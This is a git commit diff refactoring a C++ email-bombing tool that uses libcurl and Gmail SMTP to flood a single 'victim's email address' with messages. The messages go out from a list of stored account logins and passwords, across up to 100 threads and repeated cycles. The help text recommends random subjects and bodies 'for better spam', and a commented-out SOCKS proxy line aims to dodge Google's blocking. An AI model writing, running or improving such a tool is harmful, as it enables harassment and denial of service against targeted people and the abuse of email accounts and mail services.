b6711324c3e35a92516c9bbd5a6b2d4951c1dca2
Garik11 <58850520+Garik11@users.noreply.github.com>
2020-08-31 18:36:30 +0800

    Update mailsendertest.cpp

--- mailsendertest.cpp
+++ mailsendertest.cpp
@@ -7,21 +7,21 @@
 #include <locale.h>
 #include <sstream>
 
-#define CREATE_BY		"IGORERFC"
-#define VERSION			"VERSION 3.62"
-
 using namespace std;
 
-const string name_file_emails   = "emails";	//The files must be created and located in the same folder as the program
+const string CREATE_BY	= "IGORERFC";
+const string VERSION	= "VERSION 3.62";
+
+const string name_file_emails  = "emails";	//The files must be created and located in the same folder as the program
 const string name_file_text    = "text";	//The files must be created and located in the same folder as the program
 const string name_file_history = "history";
 
 const string google_service = "smtp://smtp.gmail.com:587" ;
 
-unsigned long number_of_errors = 0;
-unsigned long number_sequence =  0;
+unsigned int number_of_errors = 0;
+unsigned int number_sequence =  0;
 
-static std::string payloadText[11];
+static string payloadText[11];
 
 struct upload_status { int lines_read; };
 
@@ -46,20 +46,21 @@ enum{
 void v_error(string error_text,bool fatal_or_not) 
 {
 	if(fatal_or_not == error_no_fatal){
-		std::cout << endl << " ERROR :" << error_text << endl << endl;
+		cout << endl << " ERROR :" << error_text << endl << endl;
 	}
 	
 	if(fatal_or_not == error_fatal){
-		std::cout << endl << " FATAL ERROR :" << error_text << endl << endl;
+		cout << endl << " FATAL ERROR :" << error_text << endl << endl;
 		exit(-1);
 	}
 }
 
-void setPayloadText(const std::string &to,
-                    const std::string &from,
-                    const std::string &nameFrom,
-                    const std::string &subject,
-                    const std::string &body)
+void setPayloadText(const string &to,
+                    const string &from,
+                    const string &nameFrom,
+                    const string &subject,
+                    const string &body
+                    )
 {
     payloadText[ 0] = "Date: " ;
     payloadText[ 1] = "To: <"   + to   + ">\r\n";
@@ -106,13 +107,14 @@ static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp)
 }
 
 //sending an email using curl
-CURLcode sendEmail(const std::string &to,
-                   const std::string &from,
-                   const std::string &password,
-                   const std::string &nameFrom,
-                   const std::string &subject,
-                   const std::string &body,
-                   const std::string &url)
+CURLcode sendEmail(	const string &to,
+			const string &from,
+			const string &password,
+			const string &nameFrom,
+			const string &subject,
+			const string &body,
+			const string &url
+			)
 {
     CURLcode ret = CURLE_OK;
 
@@ -144,7 +146,7 @@ CURLcode sendEmail(const std::string &to,
      // curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
      // curl_easy_setopt(curl, CURLOPT_PROXY, "109.194.175.135:9050");//Google blocks ;-(
         
-	curl_easy_setopt(curl,CURLOPT_VERBOSE,0);
+		curl_easy_setopt(curl,CURLOPT_VERBOSE,0);
 		
         ret = curl_easy_perform(curl);
 
@@ -175,7 +177,7 @@ string gen_random(const int len)
 string get_text_from_txt(string file_name)
 {
 	fstream fout;
-	fout.open(file_name,std::ios::in);
+	fout.open(file_name,ios::in);
 	
 	if (!fout.is_open())
 		 v_error(" File opening error! " + file_name, error_fatal);
@@ -207,7 +209,7 @@ string what_str(string str_input)
 				return str_input;
 }
 
-
+//To send emails correctly and quickly
 int vec_const_init(int begin_send,int size_vec)
 {
 	int int_for_ret=0;
@@ -220,39 +222,42 @@ int vec_const_init(int begin_send,int size_vec)
 
 //Sending emails (in the amount specified by the user)
 void use_threads_for_send_mail(	vector <account> emails, 
-								int num_cy,
-								int begin_send,
-								string email_attack, 
-								email_content content) 
+				int num_cycles,
+				int begin_send,
+				string email_attack, 
+				email_content content
+				) 
 {	
 	CURLcode err;
 	
 	const int vec_email_begin = vec_const_init(begin_send,emails.size());
 	int vec_email_num = vec_email_begin;
 	
-	for (int i = 0; i < num_cy; i++){
-		while(1)
+	for (int i = 0; i < num_cycles; i++){
+		while(true)
 		{
 			err = sendEmail
-					(
-						email_attack			 		.c_str(),
-						emails[vec_email_num].login		.c_str(),
-						emails[vec_email_num].pass		.c_str(),
-						what_str(content.name) 	 		.c_str(),
-						what_str(content.subject)		.c_str(),
-						what_str(content.body)	 		.c_str(),
-						google_service			 		.c_str()
-					);
+				(
+				email_attack			 		.c_str(),
+				emails[vec_email_num].login		.c_str(),
+				emails[vec_email_num].pass		.c_str(),
+				what_str(content.name) 	 		.c_str(),
+				what_str(content.subject)		.c_str(),
+				what_str(content.body)	 		.c_str(),
+				google_service			 		.c_str()
+				);
 			if(err)
 			{
-				v_error("curl_easy_perform() failed: \n "+(string)curl_easy_strerror(err) + " " + emails[vec_email_num].login,error_no_fatal);
+				v_error("curl_easy_perform() failed: \n " + (string)curl_easy_strerror(err) + " " + emails[vec_email_num].login,error_no_fatal);
 				number_of_errors++;
 			}
 			else
-				cout << " Sent to - " 	<< email_attack << endl
-					 << " From - " 		<< emails[vec_email_num].login << endl
-					 << " Thread ID - " << this_thread::get_id() << endl << endl;
-				
+				cout << " Sent to - " << email_attack << endl
+					 << " From - " 	<< emails[vec_email_num].login << endl
+					 << " Thread ID - " << this_thread::get_id() << endl 
+					 << " Thread number - " << begin_send + 1 << endl
+					 << endl;
+			/*to send emails correctly and quickly*/
 			vec_email_num++;	
 			if(vec_email_num == (int)emails.size()) vec_email_num = 0;
 			if(vec_email_num == vec_email_begin) break;
@@ -261,7 +266,7 @@ void use_threads_for_send_mail(	vector <account> emails,
 	}
 }
 
-//convert 
+//Convert 
 account string_to_account(string str_input)
 {
 		account account_forret;
@@ -282,7 +287,7 @@ void get_mail_from_txt(vector <account> *emails,string file_name)
 {
 	stringstream text(get_text_from_txt(file_name));
 	string line;
-	while(std::getline(text, line))
+	while(getline(text, line))
         	emails->push_back(string_to_account(line));
 }
 
@@ -290,7 +295,7 @@ void get_mail_from_txt(vector <account> *emails,string file_name)
 void write_file(string str_write,string file_name)
 {
 	ofstream fout;
-	fout.open(file_name,std::ios::out | ios_base::app);
+	fout.open(file_name,ios::out | ios_base::app);
 	
 	if (!fout.is_open())
 		 v_error(" File opening error! " + file_name, error_fatal);
@@ -300,34 +305,38 @@ void write_file(string str_write,string file_name)
 }
 
 void arguments_function(string *email_attack,
-						email_content *content,
-						int *num_cy,
-						int *num_threads,
-						int argc, 
-						char **argv)
+			email_content *content,
+			int *num_cycles,
+			int *num_threads,
+			int argc, 
+			char **argv
+			)
 {
 	
 	if(argc == 2){
 		string str(argv[1]);
 		if(str == "-h" || str == "--help"){
-			cout << endl;
-			cout << " Use '-h' or '-help' arguments to get information " << endl << endl;
-			cout << " You can use 'r' for random or 's' for sequence" << endl;
-			cout << " Enter \"fr\" to use the text from the file" << endl;
-			cout << " To use arguments, enter all 6 in order : "<< endl
-				 << "\t victim's email address " 				<< endl
-				 << "\t your name \t\t\t( r/s ) " 				<< endl
-				 << "\t the subject of the letter \t( r/s ) " 	<< endl
-				 << "\t the text of the letter \t( r/s/fr ) " 	<< endl
-				 << "\t the number of cycles " 					<< endl
-				 << "\t the number of threads" 					<< endl;
-			cout << endl << " I recommend (for better spam) using 'r' where possible" << endl;
-			cout << " Example: ./name email@email.com r r r 5 30" << endl; 
+			cout<< endl;
+			cout<< " Use '-h' or '-help' arguments to get information " << endl << endl;
+			cout<< " You can use 'r' for random or 's' for sequence" << endl;
+			cout<< " Enter \"fr\" to use the text from the file" << endl;
+			cout<< " To use arguments, enter all 6 in order : "	<< endl
+				<< "\t victim's email address " 		<< endl
+				<< "\t your name \t\t\t( r/s ) " 		<< endl
+				<< "\t the subject of the letter \t( r/s ) " 	<< endl
+				<< "\t the text of the letter \t( r/s/fr ) " 	<< endl
+				<< "\t the number of cycles " 			<< endl
+				<< "\t the number of threads" 			<< endl;
+			cout<< endl << " I recommend (for better spam) using 'r' where possible" << endl;
+			cout<< " Example: ./name email@email.com r r r 5 30" << endl; 
 			
-			cout << endl << " The files must be created and located in the same folder as the program " << endl;
-			cout << " Name of the emails file \""+name_file_emails+"\"" 	<< endl;
-			cout << " Name of the text file \""+name_file_text+"\"" 		<< endl;
-			cout << " Name of the history file \""+name_file_history+"\""	<< endl;
+			cout<< endl << " The files must be created and located in the same folder as the program " << endl;
+			cout<< " Name of the emails file \""+name_file_emails+"\"" 	<< endl;
+			cout<< " Name of the text file \""+name_file_text+"\"" 		<< endl;
+			cout<< " Name of the history file \""+name_file_history+"\""<< endl << endl;
+			cout<< " Add emails in the format email@email.com:pass to file emails "<< endl
+				<< " Allow untrusted apps to access your account "	<< endl;
+
 			exit(0);
 		}
 	}
@@ -336,15 +345,14 @@ void arguments_function(string *email_attack,
 		content->name = 	argv[2];
 		content->subject = 	argv[3];
 		content->body = 	argv[4];
-		*num_cy = 			atoi(argv[5]);
+		*num_cycles = 		atoi(argv[5]);
 		*num_threads = 		atoi(argv[6]);
 	} 
 	else
-			if(argc != 1)
-				v_error(" Incorrect arguments! Use the argument '-h'",error_fatal);
+		if(argc != 1)
+			v_error(" Incorrect arguments! Use the argument '-h'",error_fatal);
 }
 
-//preview...
 void preview()
 {
 	cout << " CREATE BY " << CREATE_BY << endl;
@@ -356,39 +364,43 @@ int main(int argc, char *argv[])
 	/*Init*/
 	preview();
 	srand(time(NULL));
-	setlocale(LC_ALL,"Rus"); //Eng also works
+	setlocale(LC_ALL,"Rus");
 	
 	
 	string email_attack = "";
 	
 	email_content content = {"","",""};
 	
-	int num_cy = 0;
+	int num_cycles = 0;
 	int num_threads = 0;
 	
 	
-	arguments_function(&email_attack,&content,&num_cy,&num_threads,argc,argv);
+	arguments_function(	&email_attack,
+				&content,
+				&num_cycles,
+				&num_threads,
+				argc,
+				argv
+				);
 	
 	vector <account> emails;
 	
 	get_mail_from_txt(&emails,name_file_emails);
 	
-	std::cout << " " << emails.size() << " - GOOGLE MAIL WAS FOUND  " << endl;
+	cout << " " << emails.size() << " - GOOGLE MAIL WAS FOUND  " << endl;
 	
 	if(!emails.size()) v_error( " There are no emails ! \
-								\n Add emails in the format gm@gmail.com:pass to file emails\
-								\n Allow untrusted apps to access your account \
-								\n (・_・ヾ \n",\
-								error_fatal);
-	
+					\n Add emails in the format email@email.com:pass to file emails\
+					\n Allow untrusted apps to access your account",
+					error_fatal
+					);
 	/*Init end*/
-	
 	
 	/*Read*/
 	if(email_attack == "")
 	{
 		cout << " Write an email address for sending messages : ";
-		getline ( std::cin,email_attack);
+		getline ( cin,email_attack);
 	}
 	write_file(email_attack+'\n',name_file_history);
 	
@@ -397,54 +409,52 @@ int main(int argc, char *argv[])
 		cout << " You can use 'r' for random or 's' for sequence "<< endl;
 	
 		cout << " Enter your name (r/s) : ";
-		getline ( std::cin,content.name);
+		getline ( cin,content.name);
 		
 		cout << " Enter the subject of the letter (r/s) : ";
-		getline ( std::cin,content.subject);
+		getline ( cin,content.subject);
 	
 		cout << " Enter \"fr\" to use the text from the file" << endl;
 		cout << " Enter the text of the letter (r/s/fr) : ";
-		getline ( std::cin,content.body);
+		getline ( cin,content.body);
 	}
 	
-	if(num_cy == 0)
+	if(num_cycles == 0)
 	{
 		cout << " Enter the number of cycles (min - 1) : ";
-		cin >> num_cy;
+		cin >> num_cycles;
 	}
-	if (num_cy < 1)	v_error(" Invalid input data ",error_fatal);
+	if (num_cycles < 1)	v_error(" Invalid input data ",error_fatal);
 	
 	if(num_threads == 0)
 	{
-		cout << " Don't specify too much threads, google services will block you ( 100 < )" << endl;
+		cout << " Don't specify too much threads, google services will block you (100 <)" << endl;
 		cout << " Enter the number of threads (min - 1 & 100 <) : ";
 		cin>>num_threads;
 	}
 	if (num_threads < 1)v_error(" Invalid input data ",error_fatal);
 	
-	cout <<" "<< num_cy * num_threads * emails.size() << " - will be sent " << endl << endl;
+	cout <<" "<< num_cycles * num_threads * emails.size() << " - will be sent " << endl << endl;
 	/*Read end*/
-	
 	
 	/*Sending mails*/
 	thread* th = new thread[num_threads];
-	for (int i = 0; i < num_threads; i++)
-		th[i] = std::thread
+	for (int thread_number = 0; thread_number < num_threads; thread_number++)
+		th[thread_number] = thread
 		(
 		use_threads_for_send_mail, 
 		emails, 
-		num_cy,
-		i,
+		num_cycles,
+		thread_number,	//to send email correctly // the thread number
 		email_attack,
 		content
 		);
-	for (int i = 0; i < num_threads; i++)
-		th[i].join();
+	for (int thread_number = 0; thread_number < num_threads; thread_number++)
+		th[thread_number].join();
 	/*Sending mails end*/
 	
-	
 	/*Output of the work result*/
-	cout << " " << num_cy * num_threads * emails.size() - number_of_errors << " - emails sent successfully !" << endl;
+	cout << " " << num_cycles * num_threads * emails.size() - number_of_errors << " - emails sent successfully !" << endl;
 	/*Output of the work result end*/
 	
 }
